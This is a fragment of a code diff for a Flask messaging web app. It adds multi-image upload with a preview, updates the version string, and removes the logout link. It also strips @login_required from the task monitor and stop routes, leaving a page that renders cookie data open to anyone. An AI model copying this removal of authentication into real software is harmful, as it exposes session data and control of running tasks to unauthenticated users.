-                            <i class="fas fa-user-shield"></i> {{ session.username }}
-                            <a href="/logout" class="btn btn-sm ms-3" style="background: rgba(231, 29, 54, 0.2); color: var(--accent); border: 1px solid var(--accent);">
-                                <i class="fas fa-sign-out-alt"></i> Logout
-                            </a>
+                        <div class="text-white">
+                            <i class="fas fa-user-shield"></i> Advanced Messaging System
                         </div>
                     </div>
                 </div>
@@ -1511,13 +833,14 @@ def main_handler():
                             </div>
                             <div class="col-md-6">
                                 <div class="form-group">
-                                    <label class="form-label">IMAGE FILE (OPTIONAL)</label>
+                                    <label class="form-label">IMAGE FILES (OPTIONAL)</label>
                                     <label class="file-upload">
-                                        <input type="file" class="d-none" name="imageFile" accept=".jpg,.jpeg,.png,.gif">
-                                        <i class="fas fa-image"></i>
-                                        <div>Click to upload image</div>
-                                        <small style="color: rgba(255, 255, 255, 0.6);">JPG, PNG, GIF supported</small>
+                                        <input type="file" class="d-none" name="imageFiles" accept=".jpg,.jpeg,.png,.gif" multiple>
+                                        <i class="fas fa-images"></i>
+                                        <div>Click to upload images</div>
+                                        <small style="color: rgba(255, 255, 255, 0.6);">Multiple JPG, PNG, GIF supported</small>
                                     </label>
+                                    <div class="image-preview" id="imagePreview"></div>
                                 </div>
                             </div>
                         </div>
@@ -1570,7 +893,7 @@ def main_handler():
                             <div>Total Messages</div>
                         </div>
                         <div class="stat-card">
-                            <div class="stat-number">v2.1.0</div>
+                            <div class="stat-number">v2.2.0</div>
                             <div>System Version</div>
                         </div>
                         <div class="stat-card">
@@ -1604,10 +927,35 @@ def main_handler():
                         if (this.files.length > 0) {
                             label.style.background = 'rgba(255, 107, 53, 0.15)';
                             label.style.borderColor = 'var(--primary)';
-                            label.querySelector('div').textContent = this.files[0].name;
+                            
+                            if (this.name === 'imageFiles') {
+                                label.querySelector('div').textContent = `${this.files.length} images selected`;
+                                updateImagePreview(this.files);
+                            } else {
+                                label.querySelector('div').textContent = this.files[0].name;
+                            }
                         }
                     });
                 });
+                
+                // Image preview function
+                function updateImagePreview(files) {
+                    const preview = document.getElementById('imagePreview');
+                    preview.innerHTML = '';
+                    
+                    Array.from(files).forEach(file => {
+                        if (file.type.startsWith('image/')) {
+                            const reader = new FileReader();
+                            reader.onload = function(e) {
+                                const img = document.createElement('img');
+                                img.src = e.target.result;
+                                img.className = 'image-preview-item';
+                                preview.appendChild(img);
+                            }
+                            reader.readAsDataURL(file);
+                        }
+                    });
+                }
                 
                 // Create geometric background
                 function createGeometricBackground() {
@@ -1648,7 +996,6 @@ def main_handler():
 
 # Enhanced Monitor Page
 @app.route('/monitor/<task_id>')
-@login_required
 def monitor_task(task_id):
     if task_id not in stop_events:
         return 'Task not found', 404
@@ -1898,7 +1245,6 @@ def monitor_task(task_id):
     ''', task_id=task_id, cookies_data=cookies_data, stop_events=stop_events)
 
 @app.route('/stop/<task_id>')
-@login_required
 def stop_task(task_id):
     if task_id in stop_events:
         stop_events[task_id].set()
